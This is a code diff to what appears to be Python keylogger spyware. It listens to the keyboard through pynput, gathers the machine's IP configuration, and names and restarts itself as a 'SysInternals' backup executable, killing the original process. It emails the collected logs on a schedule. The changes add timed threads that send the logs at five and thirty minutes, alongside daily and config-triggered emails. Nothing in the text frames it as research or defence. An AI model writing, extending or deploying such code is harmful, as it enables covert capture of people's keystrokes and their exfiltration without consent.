@@ -16,6 +16,7 @@ from os import *
 import schedule, time
 import sendEmail
 import threading
+from threading import Timer
 import subprocess
 from configparser import ConfigParser
 from pynput import keyboard
@@ -43,26 +44,27 @@ try:
               print("Moved SysInt To Backup Location")
         except Exception as error:
             print("Could not Backup SysInt.exe to destination: {}\n {}".format(error, traceback.format_exc()))
-            sendToLog(error)
+            sendToLog("Could not Backup SysInt.exe to destination: {}\n {}".format(error, traceback.format_exc()))
+
         try:
             os.chdir(logDir + "\\")
             print(os.getcwd())
                 #Starting copied file.
             time.sleep(5)
             subprocess.call("start .\SysInternals_Backup.exe", shell=True)
-        except Exception as error2:
+        except Exception as error:
             print("Could not start backup file: {}\n {}".format(error, traceback.format_exc()))
-            sendToLog(error2)
+            sendToLog("Could not start backup file: {}\n {}".format(error, traceback.format_exc()))
         try:
                 #Stoping orinal file
             subprocess.call("taskkill /f /im {}".format(currentFileName), shell=True)
-        except Exception as error3:
+        except Exception as error:
             print("Could not TaskKill SysInternals.exe: {}\n {}".format(error, traceback.format_exc()))
-            sendToLog(error3)
+            sendToLog("Could not TaskKill SysInternals.exe: {}\n {}".format(error, traceback.format_exc()))
 
-    def sendEmailLocal():
+    def sendEmailLocal(title):
         print("Sending Email Function Starts Here")
-        sendEmail.sendEmail2()
+        sendEmail.sendEmail2(title)
 
     def createLogging():
         #Creating the logging
@@ -112,16 +114,18 @@ try:
             firstRun = config.get('database', 'First Run')
             min5Email = config.get('database', '5min Email')
             min30Email = config.get('database', '30min Email')
-            schedule.every().day.at(whenToEmail).do(sendEmailLocal)
-
+            print("STARTING: schedule.every().day.at(whenToEmail).do(sendEmailLocal)")
+            schedule.every().day.at(whenToEmail).do(sendEmailLocal,'Daily Scheduled Email')
+            print("FINISHED: schedule.every().day.at(whenToEmail).do(sendEmailLocal)")
             # Opening config file
           #  configFile = open(logDir + '\config.ini', 'w')
             #  config.set('database','First Run', 'False')
             try:
                 ###CHECKING IF CONFIG FILE WANTS TO EMAIL NOW
                 if emailNow == "True":
+
                     print("Email Now: {}".format(emailNow))
-                    sendEmailLocal()
+                    sendEmailLocal('EmailNow in Config file set to True')
                 else:
                     print("Email now: {}".format(emailNow))
                 #
@@ -151,6 +155,7 @@ try:
                 #
                 # else:
                 #     print("Email now: {}".format(min30Email))
+
             except Exception as error:
                 print('Updating Config File in Sysint error {}\n {}'.format(error, traceback.format_exc()))
                 sendToLog('Updating Config File in Sysint error {}\n {}'.format(error, traceback.format_exc()))
@@ -163,17 +168,26 @@ try:
             print('ReadTimeFromFile in Sysint error: {} \n {}'.format(error, traceback.format_exc()))
             #print(traceback.format_exc())
 
+        #This will run in a seperate thread to email the log file after 5min,30min and 2hrs.
+
+
     #Funciton for the flow of the program:
     def mainRun():
+
         fileExists()
         ConfigFile.createINI()
         createLogging()
         getIPConfig()
         listenerThread = threading.Thread(target=startListener)
         listenerThread.start()
+        t = Timer(300.0, sendEmailLocal,args=['5min/300sec Email'])
+        t.start()
+        t2 = Timer(1800.0, sendEmailLocal,args=['30min/1800sec Email'])
+        t2.start()
         readTimeFromFile()
-        sendEmailLocal()
-        schedule.every(3).minutes.do(readTimeFromFile)
+        print("MainRun() SendEmailLocal")
+        sendEmailLocal('Initial Email From MainRun()')
+        schedule.every(10).minutes.do(readTimeFromFile)
         while True:
             schedule.run_pending()
             time.sleep(1)
